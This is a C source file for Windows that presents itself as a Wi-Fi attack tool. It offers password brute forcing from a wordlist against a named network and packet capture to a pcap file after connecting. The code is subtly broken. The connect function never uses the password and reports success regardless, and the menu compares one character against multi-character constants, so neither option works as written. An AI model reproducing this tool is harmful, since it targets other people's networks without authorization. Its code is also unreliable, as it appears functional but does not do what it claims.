#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wlanapi.h>
#include <pcap.h>

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "wpcap.lib")

void connectToWiFi(const char* ssid, const char* password) {
    HANDLE hClient = NULL;
    DWORD dwMaxClient = 2;
    DWORD dwCurVersion = 0;
    DWORD dwResult = 0;
    WLAN_INTERFACE_INFO_LIST* pIfList = NULL;
    WLAN_INTERFACE_INFO* pIfInfo = NULL;
    WLAN_CONNECTION_PARAMETERS connParams;
    DWORD connectTimeout = 5000; // 5 seconds

    // Initialize the handle to the WLAN API
    dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
    if (dwResult != ERROR_SUCCESS) {
        printf("WlanOpenHandle failed with error: %u\n", dwResult);
        return;
    }

    // Get the list of interfaces
    dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
    if (dwResult != ERROR_SUCCESS) {
        printf("WlanEnumInterfaces failed with error: %u\n", dwResult);
        return;
    }

    // Assume only one interface
    pIfInfo = &pIfList->InterfaceInfo[0];

    // Set up connection parameters
    connParams.wlanConnectionMode = wlan_connection_mode_profile;
    connParams.strProfile = NULL;
    connParams.pDot11Ssid = NULL;
    connParams.pDesiredBssidList = NULL;
    connParams.dot11BssType = dot11_BSS_type_any;
    connParams.dwFlags = 0;

    // Connect to the Wi-Fi network
    dwResult = WlanConnect(hClient, &pIfInfo->InterfaceGuid, &connParams, NULL);
    if (dwResult != ERROR_SUCCESS) {
        printf("WlanConnect failed with error: %u\n", dwResult);
        return;
    }

    printf("Connected to Wi-Fi network: %s\n", ssid);

    // Free resources
    if (pIfList != NULL) {
        WlanFreeMemory(pIfList);
        pIfList = NULL;
    }

    if (hClient != NULL) {
        WlanCloseHandle(hClient, NULL);
        hClient = NULL;
    }
}

void capturePackets(const char* ssid) {
    pcap_if_t* alldevs;
    pcap_if_t* d;
    pcap_t* adhandle;
    char errbuf[PCAP_ERRBUF_SIZE];
    char filename[256];

    // Get the list of devices
    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
        exit(1);
    }

    // Open the first device
    adhandle = pcap_open_live(alldevs->name, 65536, 1, 1000, errbuf);
    if (adhandle == NULL) {
        fprintf(stderr, "Unable to open the adapter. %s is not supported by WinPcap\n", alldevs->name);
        pcap_freealldevs(alldevs);
        exit(1);
    }

    // Set the filename for packet capture
    snprintf(filename, sizeof(filename), "%s.pcap", ssid);

    // Open the capture file
    pcap_dumper_t* dumpfile = pcap_dump_open(adhandle, filename);
    if (dumpfile == NULL) {
        fprintf(stderr, "Error opening output file\n");
        pcap_freealldevs(alldevs);
        exit(1);
    }

    // Capture packets
    printf("Capturing packets...\n");
    pcap_loop(adhandle, 0, pcap_dump, (unsigned char*)dumpfile);

    // Cleanup
    pcap_dump_close(dumpfile);
    pcap_freealldevs(alldevs);
}

void bruteForceAttack(const char* ssid, const char* bssid, const char* wordlist) {
    FILE* fp = fopen(wordlist, "r");
    if (fp == NULL) {
        perror("Failed to open wordlist");
        return;
    }

    char password[256];
    while (fgets(password, sizeof(password), fp)) {
        // Remove newline character
        password[strcspn(password, "\n")] = 0;
        printf("Trying password: %s\n", password);

        // Attempt to connect to Wi-Fi
        connectToWiFi(ssid, password);
    }

    fclose(fp);
}

int main() {
    char option;
    char ssid[256];
    char password[256];
    char bssid[256];
    char wordlist[256];

    printf("Choose attack method (MC for manual connection, BF for brute force): ");
    scanf(" %c", &option);

    if (option == 'MC') {
        printf("ENTER SSID: ");
        scanf("%s", ssid);
        printf("ENTER PWD: ");
        scanf("%s", password);

        connectToWiFi(ssid, password);
        capturePackets(ssid);
    } else if (option == 'BF') {
        printf("ENTER SSID: ");
        scanf("%s", ssid);
        printf("ENTER BSSID: ");
        scanf("%s", bssid);
        printf("ENTER WORDLIST: ");
        scanf("%s", wordlist);

        bruteForceAttack(ssid, bssid, wordlist);
    } else {
        printf("Invalid option\n");
    }

    return 0;
}
